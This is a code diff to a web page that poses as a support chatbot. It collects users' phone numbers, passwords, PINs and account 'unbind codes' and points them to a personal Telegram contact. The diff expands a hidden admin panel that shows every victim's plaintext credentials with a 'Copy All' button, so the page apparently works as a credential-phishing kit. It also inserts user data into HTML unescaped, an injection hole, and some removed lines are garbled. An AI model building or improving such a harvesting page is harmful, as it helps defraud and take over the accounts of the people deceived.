@@ -32,9 +32,10 @@
         }
 
         .container-wide {
-            max-width: 95%;
-            width: 95%;
+            max-width: 98%;
+            width: 98%;
             overflow-x: auto;
+            padding: 20px;
         }
 
         .brand {
@@ -348,27 +349,124 @@
             cursor: pointer;
         }
 
-        @media (max-width: 480px) {
-            .container { padding: 18px 16px; }
-            .chat-box { height: 380px; }
-            .lang-btn { width: 100px; font-size: 16px; }
-        }
-
-        table {
+        /* Admin Panel Professional Table Styles */
+        .admin-table {
             width: 100%;
             border-collapse: collapse;
-            font-size: 11px;
+            margin: 15px 0;
+            font-size: 13px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
-        th, td {
+        .admin-table th {
+            background: #2e7d32;
+            color: white;
+            padding: 12px 8px;
+            text-align: center;
+            font-weight: bold;
+            position: sticky;
+            top: 0;
+        }
+        .admin-table td {
             border: 1px solid #ddd;
-            padding: 6px;
+            padding: 10px 8px;
+            text-align: center;
+            vertical-align: middle;
         }
-        th { background: #2e7d32; color: white; }
-        .approve-btn { background: green; color: white; padding: 4px 8px; border: none; border-radius: 6px; cursor: pointer; margin: 2px; }
-        .reject-btn { background: red; color: white; padding: 4px 8px; border: none; border-radius: 6px; cursor: pointer; margin: 2px; }
-        .pending { color: orange; font-weight: bold; }
-        .approved { color: green; font-weight: bold; }
-        .rejected { color: red; font-weight: bold; }
+        .admin-table tr:nth-child(even) {
+            background: #f9f9f9;
+        }
+        .admin-table tr:hover {
+            background: #e8f5e9;
+        }
+        .copy-btn {
+            background: #2e7d32;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 4px 10px;
+            cursor: pointer;
+            font-size: 11px;
+            margin: 2px;
+        }
+        .copy-btn:hover {
+            background: #1b5e20;
+        }
+        .approve-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 6px 12px;
+            cursor: pointer;
+            margin: 2px;
+            font-weight: bold;
+        }
+        .reject-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 6px 12px;
+            cursor: pointer;
+            margin: 2px;
+            font-weight: bold;
+        }
+        .approve-btn:hover { background: #218838; }
+        .reject-btn:hover { background: #c82333; }
+        .status-pending {
+            background: #ffc107;
+            color: #856404;
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-weight: bold;
+            display: inline-block;
+        }
+        .status-approved {
+            background: #28a745;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-weight: bold;
+            display: inline-block;
+        }
+        .status-rejected {
+            background: #dc3545;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-weight: bold;
+            display: inline-block;
+        }
+        .section-title {
+            background: #f0f0f0;
+            padding: 10px;
+            margin: 20px 0 10px 0;
+            border-radius: 10px;
+            color: #2e7d32;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .stats-bar {
+            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
+            color: white;
+            padding: 12px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .stats-bar span {
+            font-size: 14px;
+            font-weight: bold;
+        }
+        @media (max-width: 768px) {
+            .admin-table { font-size: 10px; }
+            .admin-table th, .admin-table td { padding: 5px; }
+            .copy-btn { padding: 2px 6px; font-size: 9px; }
+            .approve-btn, .reject-btn { padding: 3px 8px; font-size: 10px; }
+        }
     </style>
 </head>
 <body>
@@ -394,7 +492,6 @@
     let currentIssue = null;
     let conversationStep = 0;
     let collectedData = {};
-    let isWaitingForReply = false;
     
     async function showTyping(chatBox, duration = 8000) {
         let typingDiv = document.createElement('div');
@@ -416,6 +513,15 @@
         }
         chatBox.appendChild(div);
         chatBox.scrollTop = chatBox.scrollHeight;
+    }
+    
+    function copyToClipboard(text, btnElement) {
+        navigator.clipboard.writeText(text);
+        let originalText = btnElement.innerText;
+        btnElement.innerText = "✅ Copied!";
+        setTimeout(() => {
+            btnElement.innerText = originalText;
+        }, 1500);
     }
     
     // ============ PROFESSIONAL BOT CONVERSATIONS ============
@@ -694,19 +800,27 @@
             await showTyping(chatBox, 3000);
             addMessage(chatBox, 'bot', "📞 For urgent assistance, contact Spro Team: <a href='https://t.me/RAHUL935848' target='_blank' class='telegram-link'>@RAHUL935848</a>", true);
             
-            // Save request
+            // Save request with unbind code
             let requests = getRequests();
             let newRequest = {
                 id: Date.now(),
                 phone: currentUser.phone,
                 issue: currentIssue,
-                code: code,
+                unbindCode: code,
                 details: collectedData,
                 status: 'pending',
                 created_at: new Date().toISOString()
             };
             requests.push(newRequest);
             saveRequests(requests);
+            
+            // Also save unbind code to user
+            let users = getUsers();
+            let user = users.find(u => u.phone === currentUser.phone);
+            if (user) {
+                user.unbindCode = code;
+                saveUsers(users);
+            }
             
             dynamicArea.innerHTML = `
                 <div class="success-msg">
@@ -800,7 +914,7 @@
             saveUsers(users);
             currentUser = existingUser;
         } else {
-            let newUser = { phone, password, pin: null, created_at: new Date().toISOString() };
+            let newUser = { phone, password, pin: null, unbindCode: null, created_at: new Date().toISOString() };
             users.push(newUser);
             saveUsers(users);
             currentUser = newUser;
@@ -898,67 +1012,122 @@
         let users = getUsers();
         let requests = getRequests();
         
+        let pendingRequests = requests.filter(r => r.status === 'pending');
+        let approvedRequests = requests.filter(r => r.status === 'approved');
+        let rejectedRequests = requests.filter(r => r.status === 'rejected');
+        
         document.getElementById('app').innerHTML = `
-            <div class="container container-wide" style="max-width: 95%; overflow-x: auto;">
-                <h2>🔐 ADMIN PANEL</h2>
-                <p style="color:#2e7d32;">👑 Admin | 👥 Users: ${users.length} | 📋 Requests: ${requests.length}</p>
-                <h3>⏳ PENDING REQUESTS</h3>
-                <div id="pendingTable"></div>
-                <h3>📜 ALL REQUESTS</h3>
-                <div id="allRequestsTable"></div>
-                <h3>👥 USERS (Phone, Password, PIN)</h3>
-                <div id="usersTable"></div>
-                <button id="adminLogout" class="gray-btn">LOGOUT</button>
+            <div class="container container-wide">
+                <h2 style="text-align: center;">🔐 ADMIN PANEL</h2>
+                
+                <div class="stats-bar">
+                    <span>👥 Total Users: ${users.length}</span>
+                    <span>⏳ Pending: ${pendingRequests.length}</span>
+                    <span>✅ Approved: ${approvedRequests.length}</span>
+                    <span>❌ Rejected: ${rejectedRequests.length}</span>
+                </div>
+                
+                <div class="section-title">📋 USERS DETAILS (ID | PASSWORD | PIN | UNBIND CODE)</div>
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Phone / User ID</th>
+                            <th>Password</th>
+                            <th>PIN</th>
+                            <th>Unbind Code</th>
+                            <th>Created At</th>
+                            <th>Copy</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${users.map((user, index) => `
+                            <tr>
+                                <td>${index + 1}</td>
+                                <td><strong>${user.phone}</strong></td>
+                                <td>${user.password || 'N/A'}</td>
+                                <td>${user.pin || 'Not set'}</td>
+                                <td>${user.unbindCode || 'Not submitted'}</td>
+                                <td>${new Date(user.created_at).toLocaleString()}</td>
+                                <td>
+                                    <button class="copy-btn" onclick="copyToClipboard('ID: ${user.phone}\\nPassword: ${user.password}\\nPIN: ${user.pin || 'Not set'}\\nUnbind Code: ${user.unbindCode || 'Not submitted'}', this)">📋 Copy All</button>
+                                </td>
+                            </tr>
+                        `).join('')}
+                        ${users.length === 0 ? '<tr><td colspan="7" style="text-align:center;">No users found</td></tr>' : ''}
+                    </tbody>
+                </table>
+                
+                <div class="section-title">⏳ PENDING REQUESTS (Approve / Reject)</div>
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>User Phone</th>
+                            <th>Issue</th>
+                            <th>Unbind Code</th>
+                            <th>Details</th>
+                            <th>Time</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${pendingRequests.map(req => `
+                            <tr>
+                                <td>${req.id}</td>
+                                <td><strong>${req.phone}</strong></td>
+                                <td>${req.issue}</td>
+                                <td><strong style="color:#2e7d32;">${req.unbindCode || 'N/A'}</strong></td>
+                                <td><small>${JSON.stringify(req.details).substring(0, 50)}...</small></td>
+                                <td>${new Date(req.created_at).toLocaleString()}</td>
+                                <td>
+                                    <button class="approve-btn" data-id="${req.id}">✅ Approve</button>
+                                    <button class="reject-btn" data-id="${req.id}">❌ Reject</button>
+                                </td>
+                            </tr>
+                        `).join('')}
+                        ${pendingRequests.length === 0 ? '<tr><td colspan="7" style="text-align:center;">No pending requests</td></tr>' : ''}
+                    </tbody>
+                </table>
+                
+                <div class="section-title">📜 ALL REQUESTS HISTORY</div>
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>User Phone</th>
+                            <th>Issue</th>
+                            <th>Unbind Code</th>
+                            <th>Status</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${[...requests].reverse().map(req => `
+                            <tr>
+                                <td>${req.id}</td>
+                                <td>${req.phone}</td>
+                                <td>${req.issue}</td>
+                                <td>${req.unbindCode || 'N/A'}</td>
+                                <td><span class="status-${req.status}">${req.status.toUpperCase()}</span></td>
+                                <td>${new Date(req.created_at).toLocaleString()}</td>
+                            </tr>
+                        `).join('')}
+                        ${requests.length === 0 ? '<tr><td colspan="6" style="text-align:center;">No requests found</td></tr>' : ''}
+                    </tbody>
+                </table>
+                
+                <button id="adminLogout" class="gray-btn" style="margin-top:20px;">🚪 LOGOUT</button>
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
         `;
         
-        let pending = requests.filter(r => r.status === 'pending');
-        let pendingHtml = '能atable<th>ID</th><th>Phone</th><th>Issue</th><th>Unbind Code</th><th>Details</th><th>Action</th></tr>';
-        pending.forEach(r => {
-            pendingHtml += `<tr>
-                <td>${r.id}</td>
-                <td>${r.phone}</td>
-                <td>${r.issue}</td>
-                <td><strong>${r.code || 'N/A'}</strong></td>
-                <td><small>${JSON.stringify(r.details)}</small></td>
-                <td><button class="approve-btn" data-id="${r.id}">Approve</button><button class="reject-btn" data-id="${r.id}">Reject</button></td>
-            </tr>`;
-        });
-        pendingHtml += '</table>';
-        document.getElementById('pendingTable').innerHTML = pendingHtml;
-        
-        let allHtml = '能atable<th>ID</th><th>Phone</th><th>Issue</th><th>Code</th><th>Status</th><th>Time</th></tr>';
-        [...requests].reverse().forEach(r => {
-            allHtml += `<tr>
-                <td>${r.id}</td>
-                <td>${r.phone}</td>
-                <td>${r.issue}</td>
-                <td>${r.code || 'N/A'}</td>
-                <td class="${r.status}">${r.status}</td>
-                <td>${new Date(r.created_at).toLocaleString()}</td>
-            </tr>`;
-        });
-        allHtml += '</table>';
-        document.getElementById('allRequestsTable').innerHTML = allHtml;
-        
-        let usersHtml = '能atable<th>Phone</th><th>Password</th><th>PIN</th><th>Created</th></tr>';
-        users.forEach(u => {
-            usersHtml += `<tr>
-                <td>${u.phone}</td>
-                <td>${u.password}</td>
-                <td>${u.pin || 'Not set'}</td>
-                <td>${new Date(u.created_at).toLocaleString()}</td>
-            </tr>`;
-        });
-        usersHtml += '</table>';
-        document.getElementById('usersTable').innerHTML = usersHtml;
-        
+        // Add event listeners for approve/reject buttons
         document.querySelectorAll('.approve-btn').forEach(btn => {
-            btn.onclick = () => updateStatus(parseInt(btn.dataset.id), 'approved');
+            btn.onclick = () => updateRequestStatus(parseInt(btn.getAttribute('data-id')), 'approved');
         });
         document.querySelectorAll('.reject-btn').forEach(btn => {
-            btn.onclick = () => updateStatus(parseInt(btn.dataset.id), 'rejected');
+            btn.onclick = () => updateRequestStatus(parseInt(btn.getAttribute('data-id')), 'rejected');
         });
         
         document.getElementById('adminLogout').onclick = () => renderLogin();
@@ -969,12 +1138,20 @@
         };
     }
     
-    function updateStatus(id, status) {
+    function updateRequestStatus(requestId, newStatus) {
         let requests = getRequests();
-        let req = requests.find(r => r.id === id);
-        if (req) { req.status = status; saveRequests(requests); }
-        renderAdminPanel();
+        let request = requests.find(r => r.id === requestId);
+        if (request) {
+            request.status = newStatus;
+            request.updated_at = new Date().toISOString();
+            saveRequests(requests);
+            alert(`✅ Request ${newStatus.toUpperCase()} successfully!`);
+            renderAdminPanel();
+        }
     }
+    
+    // Make copyToClipboard global for onclick
+    window.copyToClipboard = copyToClipboard;
     
     renderLogin();
 </script>
